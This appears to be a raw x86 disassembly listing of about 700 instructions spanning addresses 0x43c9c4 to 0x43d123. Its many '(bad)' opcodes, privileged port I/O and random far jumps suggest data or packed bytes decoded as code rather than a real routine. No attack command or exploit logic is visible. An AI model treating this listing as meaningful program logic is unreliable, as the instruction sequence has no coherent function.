  43c9c4:	sbb    DWORD PTR [ebx-0x384dd0f3],eax
  43c9ca:	xchg   edi,eax
  43c9cb:	fistp  WORD PTR [ecx-0x1dbbc285]
  43c9d1:	stc    
  43c9d2:	jbe    0x43c985
  43c9d4:	cdq    
  43c9d5:	jns    0x43c984
  43c9d7:	fwait
  43c9d8:	jp     0x43ca0a
  43c9da:	sbb    si,WORD PTR [edi-0x4a]
  43c9de:	inc    ebp
  43c9df:	std    
  43c9e0:	add    al,0xad
  43c9e2:	ja     0x43ca62
  43c9e4:	add    al,0x75
  43c9e7:	dec    ecx
  43c9e8:	sbb    DWORD PTR [ecx],0x433bf3ea
  43c9ee:	jmp    0xcb1f:0x938d81da
  43c9f5:	cs sbb bl,ah
  43c9f8:	dec    esp
  43c9f9:	and    eax,0x34a8cf4f
  43c9fe:	dec    esp
  43c9ff:	mov    eax,ds:0x1ff87906
  43ca04:	add    bl,BYTE PTR [edx+0x8]
  43ca07:	pop    edx
  43ca08:	or     eax,0x4cd85f36
  43ca0d:	and    BYTE PTR [ebp+0x36c2e7e4],cl
  43ca13:	mov    cl,0x9a
  43ca15:	jp     0x43c9fb
  43ca17:	pop    esp
  43ca18:	xor    DWORD PTR [ebp+0x20ce1077],edx
  43ca1e:	inc    esi
  43ca1f:	push   ds
  43ca20:	adc    eax,0xe43b35d6
  43ca25:	sti    
  43ca26:	adc    DWORD PTR [eax+0x47c8711d],edx
  43ca2c:	test   BYTE PTR [ebp+0xc],0xd3
  43ca30:	cmp    eax,0x996d0de9
  43ca35:	div    DWORD PTR [eax]
  43ca37:	ins    BYTE PTR es:[edi],dx
  43ca38:	hlt    
  43ca39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ca3a:	xor    eax,DWORD PTR [edi+0x73]
  43ca3d:	shr    BYTE PTR [ebx+esi*4],cl
  43ca40:	or     al,0xaf
  43ca42:	and    BYTE PTR [edx],al
  43ca44:	leave  
  43ca45:	and    DWORD PTR [ecx],0x76
  43ca48:	lods   al,BYTE PTR ds:[esi]
  43ca49:	push   ss
  43ca4a:	or     bl,BYTE PTR [esi-0x5d]
  43ca4d:	jns    0x43ca34
  43ca4f:	mov    ecx,0xd8868d5d
  43ca54:	mov    esi,esp
  43ca56:	xchg   ebx,eax
  43ca57:	mov    cl,0xcd
  43ca59:	xchg   ecx,eax
  43ca5a:	jb     0x43ca6c
  43ca5c:	mov    ah,0xd0
  43ca5e:	dec    ecx
  43ca5f:	rcr    DWORD PTR [edx+0xc653f10],cl
  43ca65:	or     al,0xa3
  43ca67:	jmp    FWORD PTR [eax-0x54871bc8]
  43ca6d:	dec    ebx
  43ca6e:	mov    bh,0xd8
  43ca70:	mov    ds,WORD PTR [esp+eax*4]
  43ca73:	ins    DWORD PTR es:[edi],dx
  43ca74:	sbb    ecx,DWORD PTR [ecx]
  43ca76:	adc    esi,DWORD PTR [ecx-0x3cbc56ed]
  43ca7c:	mov    bl,0x31
  43ca7e:	or     BYTE PTR [ebx-0x5b057df],0xa0
  43ca85:	lea    eax,[esi+ecx*1]
  43ca88:	stos   BYTE PTR es:[edi],al
  43ca89:	xor    al,0x20
  43ca8b:	pushf  
  43ca8c:	mov    bl,0xf3
  43ca8e:	mov    ebx,0x77e08644
  43ca93:	test   al,0xd6
  43ca95:	(bad)  [esi]
  43ca97:	mov    eax,0x8a127804
  43ca9c:	cmp    eax,0xd3db823a
  43caa1:	push   0x6f876844
  43caa6:	cli    
  43caa7:	mov    al,ds:0xac447c37
  43caac:	mov    fs,esi
  43caae:	cmc    
  43caaf:	pop    ds
  43cab0:	(bad)  
  43cab1:	(bad)  
  43cab2:	mov    ds:0xc725f979,al
  43cab7:	ja     0x43cb1c
  43cab9:	inc    ebx
  43caba:	retf   
  43cabb:	mov    bh,0xb0
  43cabd:	inc    ecx
  43cabe:	push   0x1294a890
  43cac3:	in     al,0xe
  43cac5:	fmulp  st(7),st
  43cac7:	sbb    BYTE PTR fs:[ebx],ah
  43caca:	pop    edi
  43cacb:	pop    eax
  43cacc:	imul   ecx,DWORD PTR [ecx+0x2518929e],0x2
  43cad3:	sbb    BYTE PTR [edi-0x4c],bl
  43cad6:	aam    0x7a
  43cad8:	pop    ebx
  43cad9:	cmp    BYTE PTR ds:0x92f268ab,0x34
  43cae0:	imul   ecx,DWORD PTR [eax+eax*1],0x84e19ab7
  43cae7:	jnp    0x43cae3
  43cae9:	mov    edx,0x7f5b1547
  43caee:	xor    dh,BYTE PTR [edi+0x1a]
  43caf1:	xor    al,BYTE PTR [eax-0x54]
  43caf4:	in     eax,dx
  43caf5:	xor    DWORD PTR [eax+0x42],edi
  43caf8:	and    DWORD PTR [esi-0x3552ecea],esi
  43cafe:	push   cs
  43caff:	dec    ebp
  43cb00:	mov    al,BYTE PTR [edx+0x53948639]
  43cb06:	mov    ecx,0x982709b8
  43cb0b:	out    0x95,eax
  43cb0d:	out    dx,al
  43cb0e:	sar    DWORD PTR [esi+0x7f],0xd7
  43cb12:	test   esp,0x7246312a
  43cb18:	cmp    ecx,DWORD PTR [ecx]
  43cb1a:	aam    0xe5
  43cb1c:	ins    BYTE PTR es:[edi],dx
  43cb1d:	push   ss
  43cb1e:	mov    dh,0x5
  43cb20:	push   DWORD PTR ss:[eax-0xac4f081]
  43cb27:	imul   eax,DWORD PTR [ecx+0x3be08851],0x9ace1589
  43cb31:	jo     0x43cb62
  43cb33:	push   edx
  43cb34:	sub    al,0x4e
  43cb36:	lahf   
  43cb37:	loop   0x43cb7e
  43cb39:	rcr    DWORD PTR [ebx+0x2b],0x62
  43cb3d:	lock out 0xc3,al
  43cb40:	sti    
  43cb41:	pop    es
  43cb42:	out    dx,eax
  43cb43:	sbb    eax,0x717e1280
  43cb48:	and    DWORD PTR [eax-0x370ba4bb],ecx
  43cb4e:	xchg   ecx,eax
  43cb4f:	mov    edi,0x26b5cfda
  43cb54:	cli    
  43cb55:	popa   
  43cb56:	imul   edi,DWORD PTR [edi],0x17460edf
  43cb5c:	inc    ebp
  43cb5d:	xchg   DWORD PTR fs:[esi*2+0x75521706],ebp
  43cb65:	lds    ebx,FWORD PTR [edi]
  43cb67:	and    bh,BYTE PTR [edi-0x16a961d0]
  43cb6d:	jg     0x43cbaa
  43cb6f:	stos   BYTE PTR es:[edi],al
  43cb70:	aaa    
  43cb71:	sub    DWORD PTR [edx-0x54],ebp
  43cb74:	hlt    
  43cb75:	pop    ds
  43cb76:	mov    ds:0x530ba72,al
  43cb7b:	pop    ebx
  43cb7c:	loope  0x43cb7f
  43cb7e:	push   es
  43cb7f:	fisttp DWORD PTR [esi-0x133f0c33]
  43cb85:	sbb    cl,BYTE PTR [esi-0x5064a5ac]
  43cb8b:	pop    esi
  43cb8c:	cmp    dl,BYTE PTR [edx]
  43cb8e:	push   esi
  43cb8f:	cs out dx,al
  43cb91:	pop    ebx
  43cb92:	dec    edi
  43cb93:	fidiv  WORD PTR [edi+0x5e88a486]
  43cb99:	or     bh,BYTE PTR [eax-0x6a150aa5]
  43cb9f:	sbb    esp,ebx
  43cba1:	fild   WORD PTR [ebx-0x4c]
  43cba4:	fisttp WORD PTR [ebx*1-0x19b0ec57]
  43cbab:	popa   
  43cbac:	or     BYTE PTR [ebx-0x69aea261],bh
  43cbb2:	mov    edx,0x152185
  43cbb7:	or     bh,BYTE PTR [edi-0x1a]
  43cbba:	mov    al,ds:0xc7222aea
  43cbbf:	mov    WORD PTR es:[edx+0x259bc209],?
  43cbc6:	sbb    ch,al
  43cbc8:	imul   edi
  43cbca:	dec    ebx
  43cbcb:	push   esp
  43cbcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cbcd:	pop    ss
  43cbce:	mov    ch,0xca
  43cbd0:	mov    cs,WORD PTR [ecx]
  43cbd2:	bound  esp,QWORD PTR [edx-0x17]
  43cbd5:	out    0x27,al
  43cbd7:	sbb    eax,0xa0a8dd91
  43cbdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cbdd:	jbe    0x43cbe8
  43cbdf:	and    DWORD PTR [ebp+eax*8-0x7e1b0ebf],0x55
  43cbe7:	test   DWORD PTR [ebp-0x3cd00e17],0x10e9788c
  43cbf1:	(bad)  
  43cbf2:	daa    
  43cbf3:	ins    DWORD PTR es:[edi],dx
  43cbf4:	scas   eax,DWORD PTR es:[edi]
  43cbf5:	fst    QWORD PTR [ebx]
  43cbf7:	add    DWORD PTR [eax-0x5667a37c],ebp
  43cbfd:	or     ah,ch
  43cbff:	pop    ebp
  43cc00:	popf   
  43cc01:	adc    DWORD PTR cs:[ebx-0x21],esp
  43cc05:	push   0x1e
  43cc07:	out    dx,al
  43cc08:	fidiv  WORD PTR [esi+0x1b5d0908]
  43cc0e:	cdq    
  43cc0f:	push   edi
  43cc10:	inc    esi
  43cc11:	jbe    0x43cc1d
  43cc13:	or     DWORD PTR [ebx],esp
  43cc15:	pop    esp
  43cc16:	or     BYTE PTR cs:0x56bbcb9,dl
  43cc1d:	or     DWORD PTR [esi+0x52],eax
  43cc20:	dec    edx
  43cc21:	in     eax,dx
  43cc22:	pop    edi
  43cc23:	pop    ss
  43cc24:	out    0x40,eax
  43cc26:	cmc    
  43cc27:	das    
  43cc28:	mov    ds:0x30e8edab,al
  43cc2d:	dec    ebx
  43cc2e:	mov    WORD PTR [edi-0x73],ds
  43cc31:	(bad)  
  43cc32:	jbe    0x43cc1e
  43cc34:	add    edx,ebp
  43cc36:	mov    esp,0xf5655c1f
  43cc3b:	sbb    eax,0xaa23587f
  43cc40:	sar    DWORD PTR [esi],0x17
  43cc43:	push   eax
  43cc44:	xor    eax,0x330ef21d
  43cc49:	outs   dx,BYTE PTR ds:[esi]
  43cc4a:	repnz push edi
  43cc4c:	inc    edi
  43cc4d:	stc    
  43cc4e:	pop    ebp
  43cc4f:	push   esi
  43cc50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cc51:	jle    0x43cc25
  43cc53:	xor    ah,al
  43cc55:	inc    ebp
  43cc56:	jnp    0x43cc25
  43cc58:	mov    esp,0xe4f6e510
  43cc5d:	out    dx,eax
  43cc5e:	inc    edx
  43cc5f:	inc    ebp
  43cc60:	cmp    eax,0x93683694
  43cc65:	xchg   ecx,eax
  43cc66:	lahf   
  43cc67:	mov    DWORD PTR [edi+0x22],ecx
  43cc6a:	dec    ebx
  43cc6b:	sbb    ah,dl
  43cc6d:	mov    ebp,0x4d7858d4
  43cc72:	xchg   esi,eax
  43cc73:	fmul   DWORD PTR [eax+ecx*1]
  43cc76:	pop    ss
  43cc77:	and    eax,0x915eeb47
  43cc7c:	out    dx,eax
  43cc7d:	pop    es
  43cc7e:	pushf  
  43cc7f:	push   edx
  43cc80:	shl    ch,0x8c
  43cc83:	repz fsubr DWORD PTR [ebx-0x7f2c2e35]
  43cc8a:	xchg   ebp,eax
  43cc8b:	lds    eax,FWORD PTR [ebx]
  43cc8d:	pop    esp
  43cc8e:	sub    ebp,ecx
  43cc90:	sub    ecx,edi
  43cc92:	int3   
  43cc93:	(bad)  
  43cc94:	neg    ecx
  43cc96:	xor    DWORD PTR [edx-0x868fd93],0x7b
  43cc9d:	jnp    0x43cc45
  43cc9f:	push   edi
  43cca0:	fld    DWORD PTR [ebx]
  43cca2:	fxch   st(1)
  43cca4:	pop    edi
  43cca5:	leave  
  43cca6:	sub    ecx,0x61
  43cca9:	hlt    
  43ccaa:	push   cs
  43ccab:	and    eax,0x1d395da8
  43ccb0:	loopne 0x43ccb7
  43ccb2:	pop    edx
  43ccb3:	mov    ?,WORD PTR [esi]
  43ccb5:	retf   0x7d2f
  43ccb8:	jne    0x43cc84
  43ccba:	sub    ecx,DWORD PTR [edx-0x77]
  43ccbd:	rcl    BYTE PTR [esi+0x5460554b],1
  43ccc3:	cmp    ch,al
  43ccc5:	xchg   edi,eax
  43ccc6:	mov    WORD PTR [ecx-0x52b78389],ss
  43cccc:	lds    ebp,FWORD PTR [ebx+esi*1-0x21]
  43ccd0:	stos   BYTE PTR es:[edi],al
  43ccd1:	push   esi
  43ccd2:	sub    ch,BYTE PTR [eax]
  43ccd4:	(bad)  
  43ccd5:	xor    DWORD PTR [edx+0x28],edi
  43ccd8:	fistp  WORD PTR [esi+0x2d]
  43ccdb:	sbb    ebp,DWORD PTR [edx+esi*8-0x6869df1]
  43cce2:	dec    ebp
  43cce3:	fadd   st,st(7)
  43cce5:	or     bh,dl
  43cce7:	inc    ebp
  43cce8:	popf   
  43cce9:	add    al,0x67
  43cceb:	and    cl,BYTE PTR [edx-0x7730ea42]
  43ccf1:	mov    ch,BYTE PTR [edx-0x75]
  43ccf4:	push   ebx
  43ccf5:	rol    BYTE PTR [ebx-0x521c7741],cl
  43ccfb:	push   cs
  43ccfc:	xchg   esi,eax
  43ccfd:	dec    ecx
  43ccfe:	mov    cl,0xaa
  43cd00:	fldenv [ebp+0x69]
  43cd03:	retf   0x7f35
  43cd06:	fsub   DWORD PTR ds:0x81a875df
  43cd0c:	ss inc esp
  43cd0e:	fwait
  43cd0f:	inc    edi
  43cd10:	pop    edi
  43cd11:	aad    0xd3
  43cd13:	ds inc ecx
  43cd15:	xor    al,0x71
  43cd18:	test   DWORD PTR [eax+eiz*2+0x5],edx
  43cd1c:	mov    eax,0x51a87798
  43cd21:	ret    0x4333
  43cd24:	popf   
  43cd25:	popf   
  43cd26:	popf   
  43cd27:	shr    dh,1
  43cd29:	lock (bad) [ebx]
  43cd2c:	mov    esp,0xc344748c
  43cd31:	jno    0x43cd9e
  43cd33:	(bad)  
  43cd35:	add    eax,0xfcab1797
  43cd3a:	shl    DWORD PTR [ecx],0x46
  43cd3d:	pop    ecx
  43cd3e:	inc    edx
  43cd3f:	inc    esp
  43cd40:	sbb    al,0xb6
  43cd42:	icebp  
  43cd43:	fnstsw WORD PTR [ecx+ecx*8+0x3b3fc695]
  43cd4a:	bnd jo 0x43ccf2
  43cd4d:	mov    ds:0xdf4f1dff,eax
  43cd52:	into   
  43cd53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cd54:	xor    eax,ecx
  43cd56:	mov    edx,0xd69b0398
  43cd5b:	mov    bh,0xd8
  43cd5d:	pop    esp
  43cd5e:	fcom   QWORD PTR [ebx]
  43cd60:	test   BYTE PTR fs:[ebp-0x70],al
  43cd64:	int    0x9e
  43cd66:	mov    al,ds:0x99fb71d4
  43cd6b:	shr    DWORD PTR [ebx+0x7f],0xdc
  43cd6f:	in     al,dx
  43cd70:	mov    ebp,0x2d18f318
  43cd75:	ret    
  43cd76:	push   esi
  43cd77:	ror    BYTE PTR ss:[eax],cl
  43cd7a:	adc    BYTE PTR [eax],al
  43cd7c:	and    dh,BYTE PTR [esi]
  43cd7e:	jnp    0x43cd84
  43cd80:	mov    dh,0xfc
  43cd82:	idiv   DWORD PTR [esi-0x43d0bbd7]
  43cd88:	out    0x60,al
  43cd8a:	adc    eax,0x2304f839
  43cd8f:	int    0x2
  43cd91:	out    dx,eax
  43cd92:	jno    0x43cd5c
  43cd94:	cmp    dh,bh
  43cd96:	mov    edx,0x8d2f9a80
  43cd9b:	sub    DWORD PTR [ebx-0x28],edi
  43cd9e:	sub    eax,0xadf98b50
  43cda3:	shl    DWORD PTR [edx+edx*4],cl
  43cda6:	add    ecx,esi
  43cda8:	or     eax,0x92717e3a
  43cdad:	enter  0xb89a,0x20
  43cdb1:	sub    dh,dh
  43cdb3:	shl    DWORD PTR [ebx],cl
  43cdb5:	xor    esi,ecx
  43cdb7:	jl     0x43cd8a
  43cdb9:	add    DWORD PTR [edx],eax
  43cdbb:	sti    
  43cdbc:	sub    edx,DWORD PTR [edx-0x2e5f4dbc]
  43cdc2:	sub    BYTE PTR [eax-0x48e7502c],dh
  43cdc8:	hlt    
  43cdc9:	jne    0x43cd75
  43cdcb:	fisubr DWORD PTR [ecx]
  43cdcd:	data16 fist DWORD PTR [edx+ebx*4+0x12]
  43cdd2:	shl    BYTE PTR [eax],0x45
  43cdd5:	add    eax,0x79db227f
  43cdda:	mov    dh,0xf7
  43cddc:	mov    ?,WORD PTR cs:[edx+0x731cb388]
  43cde3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cde4:	jmp    0xa460:0xd1826b57
  43cdeb:	xchg   esi,eax
  43cdec:	jp     0x43ce5a
  43cdee:	les    esi,FWORD PTR [esi-0x15]
  43cdf1:	fs mov eax,0x806bdfce
  43cdf7:	adc    bl,0x86
  43cdfa:	lahf   
  43cdfb:	lods   eax,DWORD PTR ds:[esi]
  43cdfc:	sti    
  43cdfd:	mov    dh,0x75
  43cdff:	mov    edi,0x876f9b47
  43ce04:	dec    ecx
  43ce05:	xor    DWORD PTR [ebx],ecx
  43ce07:	xchg   BYTE PTR [ecx],ch
  43ce09:	inc    eax
  43ce0a:	lock popf 
  43ce0c:	add    DWORD PTR [ecx],0x16
  43ce0f:	cdq    
  43ce10:	pop    ebp
  43ce11:	or     ebx,ebp
  43ce13:	gs loopne 0x43ce2f
  43ce16:	sti    
  43ce17:	dec    esp
  43ce18:	into   
  43ce19:	mov    fs,WORD PTR [ebx+0x58b2f255]
  43ce1f:	test   DWORD PTR [edx+eiz*1+0x33a03c2f],esp
  43ce26:	inc    edx
  43ce27:	push   0xffffffff
  43ce29:	test   ah,dl
  43ce2b:	jge    0x43cde7
  43ce2d:	fwait
  43ce2e:	out    0x99,al
  43ce30:	and    BYTE PTR [eax],dh
  43ce32:	inc    edx
  43ce33:	test   BYTE PTR ds:0x5593dfc1,bl
  43ce39:	dec    edi
  43ce3a:	pop    edi
  43ce3b:	ror    BYTE PTR [esp+ebp*4],cl
  43ce3e:	lea    edx,[esi+0x167bccbe]
  43ce44:	sbb    esi,DWORD PTR [esi+ecx*1-0x40f60fb]
  43ce4b:	fadd   DWORD PTR [esi+ebp*8-0x38]
  43ce4f:	add    BYTE PTR ss:[eax],bl
  43ce52:	xchg   esi,eax
  43ce53:	mov    esp,DWORD PTR [esi+0x5311ddc4]
  43ce59:	das    
  43ce5a:	jge    0x43ce18
  43ce5c:	push   0x5aac8673
  43ce61:	push   ecx
  43ce62:	mov    esi,0xdda42039
  43ce67:	push   0x71
  43ce69:	adc    al,0x21
  43ce6b:	outs   dx,DWORD PTR ds:[esi]
  43ce6c:	mov    al,ds:0x3cac62ea
  43ce71:	mov    esi,0x4b1b0233
  43ce76:	mov    bh,cl
  43ce78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ce79:	inc    ebx
  43ce7a:	pop    esi
  43ce7b:	mov    bl,0xcb
  43ce7d:	in     al,0x1f
  43ce7f:	call   0x5269:0xb7fcd1b0
  43ce86:	(bad)  
  43ce88:	fst    QWORD PTR [ebp-0x65]
  43ce8b:	cmp    edx,DWORD PTR [edx]
  43ce8d:	push   ebx
  43ce8e:	jge    0x43ce28
  43ce90:	sbb    ch,BYTE PTR [ebp-0x32]
  43ce93:	ror    DWORD PTR [ebx+ecx*4-0x40],1
  43ce97:	stos   DWORD PTR es:[edi],eax
  43ce98:	mov    edx,0xf324ff84
  43ce9d:	aad    0xd6
  43ce9f:	and    eax,0x4e07d432
  43cea4:	aam    0xd2
  43cea6:	aad    0x6b
  43cea8:	mov    dl,dl
  43ceaa:	ds fsub st(0),st
  43cead:	mov    WORD PTR [ebp+edi*1+0x26],?
  43ceb1:	xchg   edi,eax
  43ceb2:	pop    ds
  43ceb3:	dec    ecx
  43ceb4:	call   0x1a8ad1bd
  43ceb9:	mov    dh,0x3d
  43cebb:	mov    edi,0xb7b7c533
  43cec0:	cmp    eax,0x880a7edc
  43cec5:	popf   
  43cec6:	idiv   DWORD PTR [ecx]
  43cec8:	pusha  
  43cec9:	mov    BYTE PTR [ebx-0x40],0x3b
  43cecd:	out    dx,al
  43cece:	pop    edi
  43cecf:	xchg   ebp,eax
  43ced0:	mov    esi,0x53ceec3a
  43ced5:	dec    ebp
  43ced6:	push   edi
  43ced7:	jns    0x43ce5e
  43ced9:	outs   dx,BYTE PTR ds:[esi]
  43ceda:	jno    0x43cef4
  43cedc:	and    DWORD PTR [ebp-0x43],eax
  43cedf:	or     esi,DWORD PTR [edx+0x6c]
  43cee2:	mov    edx,0x43519d25
  43cee7:	je     0x43cebb
  43cee9:	fmulp  st(2),st
  43ceeb:	fldcw  WORD PTR [esi]
  43ceed:	push   ebp
  43ceee:	sahf   
  43ceef:	rcr    BYTE PTR ds:0x53d4c268,1
  43cef5:	or     ebx,esp
  43cef7:	ins    DWORD PTR es:[edi],dx
  43cef8:	xor    dl,dl
  43cefa:	cmp    BYTE PTR [ebp+0x1b1ef72e],al
  43cf00:	lahf   
  43cf01:	(bad)  
  43cf02:	sub    ebp,DWORD PTR [ebp-0x648ccfbb]
  43cf08:	add    eax,DWORD PTR [ebp-0x37]
  43cf0b:	sub    DWORD PTR [ebp-0x39deafb],esp
  43cf11:	cmc    
  43cf12:	mov    dl,0x88
  43cf14:	das    
  43cf15:	dec    edx
  43cf16:	loopne 0x43ceac
  43cf18:	mov    eax,ds:0x4cd443a3
  43cf1d:	mov    dl,BYTE PTR ds:0xebc8fa4
  43cf23:	out    0xc0,eax
  43cf25:	out    0x7c,eax
  43cf27:	aaa    
  43cf28:	push   edi
  43cf29:	jecxz  0x43ced7
  43cf2b:	fsub   st,st(0)
  43cf2d:	(bad)
  43cf30:	xor    DWORD PTR [ecx+0x1c],0x604836fa
  43cf37:	rol    ebx,0x39
  43cf3a:	lods   eax,DWORD PTR ds:[esi]
  43cf3b:	add    al,BYTE PTR [edx+0x3]
  43cf3e:	xor    eax,DWORD PTR [esi]
  43cf40:	jecxz  0x43cf12
  43cf42:	pop    esp
  43cf43:	shr    BYTE PTR [ebx-0x3c],0x30
  43cf47:	xor    BYTE PTR [esi],dh
  43cf49:	jmp    0xf3d9:0xd32ee6f0
  43cf50:	(bad)  
  43cf54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cf55:	std    
  43cf56:	adc    dl,al
  43cf58:	inc    esi
  43cf59:	ins    DWORD PTR es:[edi],dx
  43cf5a:	pop    ss
  43cf5b:	or     ecx,ebx
  43cf5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cf5e:	fwait
  43cf5f:	sub    al,0x74
  43cf61:	jo     0x43cf1b
  43cf63:	mov    BYTE PTR [eax],al
  43cf65:	(bad)  
  43cf66:	cwde   
  43cf67:	das    
  43cf68:	jmp    0x43cf69
  43cf6a:	lods   eax,DWORD PTR ds:[esi]
  43cf6b:	pop    esi
  43cf6c:	enter  0x615f,0x6
  43cf70:	adc    ebx,DWORD PTR [ebx]
  43cf72:	mov    BYTE PTR [edx-0x57],bl
  43cf75:	sub    eax,0xe854732b
  43cf7a:	mov    edx,0x7ac9458b
  43cf7f:	or     al,0xef
  43cf81:	adc    eax,0x32c19004
  43cf86:	adc    ch,BYTE PTR [eax]
  43cf88:	jp     0x43cffd
  43cf8a:	and    dh,al
  43cf8c:	(bad)  
  43cf8d:	pop    ds
  43cf8e:	push   edx
  43cf8f:	add    ah,BYTE PTR [esi+0x33]
  43cf92:	xchg   dh,bh
  43cf94:	stos   DWORD PTR es:[edi],eax
  43cf95:	jne    0x43cf92
  43cf97:	movntq QWORD PTR [eax],mm5
  43cf9a:	test   BYTE PTR fs:[edx+0x19],ch
  43cf9e:	xchg   ebp,eax
  43cf9f:	xchg   ebp,eax
  43cfa0:	leave  
  43cfa1:	repnz inc ebp
  43cfa3:	pop    ebx
  43cfa4:	imul   ebx,ecx,0x9677eb7
  43cfaa:	pushf  
  43cfab:	test   DWORD PTR [esi],ebx
  43cfad:	push   esi
  43cfae:	lds    ebp,FWORD PTR [esi]
  43cfb0:	cli    
  43cfb1:	or     ebp,eax
  43cfb3:	xchg   DWORD PTR [eax+0x4128f643],ecx
  43cfb9:	loope  0x43cf79
  43cfbb:	sbb    DWORD PTR [edi],ebp
  43cfbd:	stos   BYTE PTR es:[edi],al
  43cfbe:	fsubr  QWORD PTR [edi]
  43cfc0:	jp     0x43cf60
  43cfc2:	rcr    ch,0xa4
  43cfc5:	call   0xfbdb0a3f
  43cfca:	mov    ah,0xbe
  43cfcc:	mov    ds:0x7265b376,al
  43cfd1:	sbb    eax,0x191ce65d
  43cfd6:	sbb    edi,DWORD PTR ds:0xf616fd5b
  43cfdc:	push   edx
  43cfdd:	repnz arpl WORD PTR [edi],ax
  43cfe0:	fmul   st(1),st
  43cfe2:	and    DWORD PTR [eax-0x18],eax
  43cfe5:	lock pop ebx
  43cfe7:	push   edi
  43cfe8:	test   BYTE PTR [edi+0x36],al
  43cfeb:	ins    DWORD PTR es:[edi],dx
  43cfec:	push   eax
  43cfed:	and    esp,DWORD PTR ds:0x6976e1c0
  43cff3:	dec    edi
  43cff4:	loopne 0x43d051
  43cff6:	les    ebp,FWORD PTR [eax]
  43cff8:	lods   al,BYTE PTR ds:[esi]
  43cff9:	xchg   esi,eax
  43cffa:	adc    eax,0x61db3a70
  43cfff:	stos   DWORD PTR es:[edi],eax
  43d000:	jb     0x43cfe5
  43d002:	jae    0x43cfb5
  43d004:	mov    ah,0x4f
  43d006:	sub    dh,BYTE PTR [esp+ebp*4]
  43d009:	mov    DWORD PTR [eax],edx
  43d00b:	lds    ebx,FWORD PTR [ecx+0x31]
  43d00e:	ds mov dl,0xc6
  43d012:	cmc    
  43d013:	jo     0x43cff5
  43d015:	push   ebp
  43d016:	call   0xedf:0xfa8f207f
  43d01d:	cdq    
  43d01e:	dec    esp
  43d01f:	xchg   ecx,eax
  43d020:	push   edx
  43d021:	mov    dl,0xd8
  43d023:	mov    eax,DWORD PTR [edx-0x3dac1dbf]
  43d029:	mov    dh,0xf
  43d02b:	pop    ebx
  43d02c:	int    0xe7
  43d02e:	outs   dx,DWORD PTR ds:[esi]
  43d02f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d030:	scas   al,BYTE PTR es:[edi]
  43d031:	xor    ah,cl
  43d033:	aad    0x69
  43d035:	stc    
  43d036:	dec    bh
  43d038:	shl    cl,cl
  43d03a:	sbb    esp,esp
  43d03c:	sbb    BYTE PTR [edx+ebp*2-0x6c],ah
  43d040:	xlat   BYTE PTR ds:[ebx]
  43d041:	mov    bh,0x88
  43d043:	pop    ss
  43d044:	push   ebx
  43d045:	dec    ebp
  43d046:	dec    esi
  43d047:	jle    0x43d010
  43d049:	inc    esi
  43d04a:	mov    al,ds:0x7926c645
  43d04f:	dec    eax
  43d050:	mov    eax,ds:0x7e3750c1
  43d055:	sti    
  43d056:	push   ds
  43d057:	mov    cl,0x8b
  43d059:	sub    eax,0x50e55056
  43d05e:	add    eax,0x8c6549d8
  43d063:	adc    BYTE PTR [eax],bh
  43d065:	push   esi
  43d066:	cmp    eax,0x5cd4c3c6
  43d06b:	stc    
  43d06c:	test   esp,edx
  43d06e:	or     ecx,0x71
  43d071:	ss mov es,edx
  43d074:	pop    ebx
  43d075:	in     eax,dx
  43d076:	xor    edi,esp
  43d078:	cli    
  43d079:	inc    edx
  43d07a:	mov    edi,DWORD PTR [ebx-0x63]
  43d07d:	hlt    
  43d07e:	and    ebx,DWORD PTR [ebp+0x3f]
  43d081:	pop    edi
  43d082:	xor    ebx,DWORD PTR [edx]
  43d084:	jmp    0xede8:0x9f1d329b
  43d08b:	fsub   DWORD PTR ds:0x4c3137d7
  43d091:	and    BYTE PTR [ebp-0x758e02af],ah
  43d097:	jno    0x43d01d
  43d099:	scas   al,BYTE PTR es:[edi]
  43d09a:	push   edi
  43d09b:	cwde   
  43d09c:	xchg   esp,eax
  43d09d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d09e:	sbb    ecx,DWORD PTR [esi+eax*1]
  43d0a1:	popa   
  43d0a2:	nop
  43d0a3:	arpl   WORD PTR [ecx-0x424ab20d],dx
  43d0a9:	fild   DWORD PTR [edi+0x15cf9fc3]
  43d0af:	or     eax,0x1bc823ef
  43d0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d0b5:	mov    bh,0xb
  43d0b7:	icebp  
  43d0b8:	(bad)  
  43d0b9:	sar    BYTE PTR [eax+ebx*4],1
  43d0bc:	jns    0x43d0a8
  43d0be:	xchg   ebx,eax
  43d0bf:	push   edi
  43d0c0:	xchg   ebx,eax
  43d0c1:	sbb    eax,0x9d0f7f7
  43d0c6:	add    ebp,ebp
  43d0c8:	push   ebp
  43d0c9:	(bad)  
  43d0ca:	in     al,0x14
  43d0cc:	nop
  43d0cd:	lahf   
  43d0ce:	fs xor esi,esp
  43d0d1:	ins    DWORD PTR es:[edi],dx
  43d0d2:	mov    edi,0x1b58dcbb
  43d0d7:	push   cs
  43d0d8:	pop    eax
  43d0d9:	jmp    0xbe3d:0x75721ba7
  43d0e0:	and    BYTE PTR [ebx],dh
  43d0e2:	test   al,0x22
  43d0e4:	out    0x43,al
  43d0e6:	sti    
  43d0e7:	jnp    0x43d0cd
  43d0e9:	ja     0x43d0c7
  43d0eb:	mov    al,ds:0x79f61e50
  43d0f0:	imul   ebx,esp,0x76
  43d0f3:	mov    ds:0x6d465883,eax
  43d0f8:	sbb    DWORD PTR [edi],eax
  43d0fa:	loop   0x43d10c
  43d0fc:	dec    esp
  43d0fe:	shl    esp,0x60
  43d101:	lds    ebx,FWORD PTR [edx-0xc939f05]
  43d107:	mov    ebp,0xf8e3638e
  43d10c:	pop    ss
  43d10d:	ja     0x43d0d3
  43d10f:	je     0x43d138
  43d111:	fld    QWORD PTR [ebx+0x7e4a148f]
  43d117:	inc    BYTE PTR [ebp+0x7b0a6bc2]
  43d11d:	rcl    BYTE PTR [ebx],1
  43d11f:	(bad)  
  43d120:	ja     0x43d199
  43d122:	pop    ecx
  43d123:	cld    
